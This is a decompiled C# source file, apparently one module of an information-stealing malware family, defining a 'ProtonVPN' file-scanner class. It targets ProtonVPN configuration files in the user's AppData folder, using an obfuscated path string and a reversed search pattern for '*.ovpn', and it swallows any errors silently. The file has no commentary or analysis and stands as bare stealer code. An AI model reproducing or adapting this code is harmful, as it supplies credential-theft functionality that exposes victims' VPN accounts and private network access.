using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

// Token: 0x0200002B RID: 43
public class ProtonVPN : FileScanner
{
	// Token: 0x060000DB RID: 219 RVA: 0x00003867 File Offset: 0x00001A67
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x060000DC RID: 220 RVA: 0x00008F80 File Offset: 0x00007180
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPstring.ReplaceROFILE%\\Apstring.ReplacepData\\Locastring.Replacel").Replace("string.Replace", string.Empty), "ProtonVPN"),
				Pattern = new string("npvo*".Reverse<char>().ToArray<char>()),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
